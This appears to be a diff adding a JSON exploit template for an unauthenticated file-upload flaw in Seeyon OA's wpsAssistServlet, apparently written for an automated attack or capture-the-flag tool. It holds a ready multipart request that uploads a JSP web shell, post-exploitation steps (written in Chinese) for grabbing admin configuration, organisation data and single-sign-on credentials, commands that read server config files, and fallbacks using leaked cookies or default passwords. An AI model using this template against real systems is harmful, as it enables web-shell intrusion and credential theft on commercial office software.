@@ -1,0 +1,114 @@
+{
+  "id": "seeyon-oa-wpsassistservlet-file-upload",
+  "family": "oa",
+  "product": "Seeyon OA",
+  "cve": "N/A",
+  "aliases": [
+    "致远 OA wpsAssistServlet upload",
+    "Seeyon wpsAssistServlet"
+  ],
+  "severity": "high",
+  "tags": [
+    "oa",
+    "seeyon",
+    "wpsassistservlet",
+    "file-upload",
+    "jsp"
+  ],
+  "applicability": {
+    "versions": [
+      "A8",
+      "A8-N",
+      "V8"
+    ],
+    "fingerprints": [
+      "Target exposes /seeyon/wpsAssistServlet",
+      "Seeyon office-integration or WPS collaboration modules are enabled",
+      "Login resources or HTML titles identify the platform as Seeyon / 致远"
+    ],
+    "signals": [
+      "Multipart traffic reaches the servlet without full authentication",
+      "Response includes attachment ids, temporary file identifiers, or relative storage paths",
+      "Uploaded office-style probe files can be enumerated or fetched afterward"
+    ]
+  },
+  "preconditions": [
+    "The deployment keeps the WPS assist servlet enabled and reachable.",
+    "The upload flow does not strictly bind uploads to an authenticated office session.",
+    "Stored content lands in a path that can be fetched, parsed, or linked into another workflow."
+  ],
+  "verification": {
+    "method": "http_post",
+    "requests": [
+      {
+        "path": "/seeyon/wpsAssistServlet",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "multipart/form-data; boundary=----ctfboundary",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "------ctfboundary\\r\\nContent-Disposition: form-data; name=\"upload\"; filename=\"probe.docx\"\\r\\nContent-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document\\r\\n\\r\\nOA_WPS_PROBE\\r\\n------ctfboundary--\\r\\n",
+        "matchers": [
+          "Response contains attachment id, relative path, or upload success marker",
+          "Stored probe can be referenced back by the returned identifier"
+        ]
+      }
+    ]
+  },
+  "exploitation": {
+    "mode": "file_upload",
+    "requests": [
+      {
+        "path": "/seeyon/wpsAssistServlet",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "multipart/form-data; boundary=----ctfboundary",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "------ctfboundary\\r\\nContent-Disposition: form-data; name=\"upload\"; filename=\"office.jsp\"\\r\\nContent-Type: application/octet-stream\\r\\n\\r\\n<JSP_PAYLOAD>\\r\\n------ctfboundary--\\r\\n",
+        "os_hint": "windows"
+      }
+    ]
+  },
+  "post_exploitation": {
+    "stabilization": [
+      "优先确认该落点究竟是临时目录、附件目录还是 Web 可执行目录。",
+      "如果只能写附件，继续寻找附件预览、导入、模板加载或流程配置中的二次触发点。",
+      "拿到初始 foothold 后优先抓取 OA 管理后台配置、组织架构数据和单点登录凭据。"
+    ],
+    "shell_options": [
+      {
+        "type": "jsp_webshell_write",
+        "template": "Abuse the WPS assist upload path to land a JSP foothold and trigger it from the returned identifier"
+      }
+    ]
+  },
+  "stability": {
+    "preferred_order": [
+      "先用 benign office file 证明上传链存在。",
+      "再确定存储路径、文件后缀处理和可访问方式。",
+      "如果不可直接执行，转为附件利用、配置读取或流程导入链。"
+    ],
+    "safe_commands": [
+      "whoami",
+      "hostname",
+      "type conf\\server.conf"
+    ],
+    "shell_prerequisites": [
+      "Uploaded content must be retrievable or usable by another server-side parsing component.",
+      "If aiming for JSP execution, the landing directory must allow server-side script parsing."
+    ],
+    "fallbacks": [
+      "If uploads are stored outside the Web root, pivot to document preview, office conversion, or attachment management endpoints.",
+      "If the servlet is partially authenticated, combine with leaked cookies or weak/default OA credentials."
+    ]
+  },
+  "detection_notes": [
+    "This path often matters in multi-step OA challenges because the first win is the ability to store or reference attacker-controlled content, not necessarily immediate code execution.",
+    "WPS-related flows can create noisy artifacts in attachment lists, so validate once and pivot quickly."
+  ],
+  "references": [
+    "Public Seeyon OA WPS assist upload analyses",
+    "Common Seeyon V8 attack-chain notes involving office integration components"
+  ]
+}
